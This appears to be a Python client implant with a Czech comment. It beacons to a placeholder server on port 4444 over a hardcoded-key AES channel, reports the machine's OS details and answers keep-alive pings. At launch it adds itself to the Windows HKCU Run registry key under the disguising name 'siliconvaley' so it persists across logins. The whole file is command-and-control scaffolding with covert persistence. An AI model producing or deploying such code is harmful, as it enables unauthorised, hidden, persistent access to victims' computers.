import os
import socket
import time
import platform
import pickle
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import socket
import psutil

SOCKET_HOST = 'server_ip_here'  # Změň na IP serveru
SOCKET_PORT = 4444
SOCKET_KEY = b'sixteen byte key1234567890123456'  # 32 bytes key
SOCKET_IV = b'initialvector123'  # 16 bytes IV

# AES ENCRYPTION/DECRYPTION
def encrypt_msg(msg):
    cipher = AES.new(SOCKET_KEY, AES.MODE_CBC, SOCKET_IV)
    pad = 16 - len(msg) % 16
    msg += chr(pad) * pad
    return cipher.encrypt(msg.encode())

def decrypt_msg(msg):
    cipher = AES.new(SOCKET_KEY, AES.MODE_CBC, SOCKET_IV)
    decrypted = cipher.decrypt(msg)
    pad = decrypted[-1]
    return decrypted[:-pad].decode()

# Get OS version
def get_os_info():
    os_info = platform.system() + ' ' + platform.version()
    return os_info

# Socket Client
def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SOCKET_HOST, SOCKET_PORT))
            break
        except:
            print("Server not reachable, retrying in 5 seconds...")
            time.sleep(5)

    os_info = get_os_info()
    msg = encrypt_msg(f'{os_info}|{platform.version()}')
    s.send(msg)
    while True:
        try:
            msg = s.recv(2048)
            msg = decrypt_msg(msg)
            if msg == 'ping':
                s.send(encrypt_msg('ping'))
        except:
            break
    s.close()

# Auto start on Windows login
def add_to_registry():
    reg_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    reg_value = "siliconvaley"
    script_path = os.path.abspath(__file__)
    try:
        import winreg
        registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        reg_open = winreg.OpenKey(registry, reg_key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_open, reg_value, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_open)
    except ImportError:
        print("Failed to add to registry")

# Main function to run the client
if __name__ == "__main__":
    add_to_registry()
    connect_to_server()
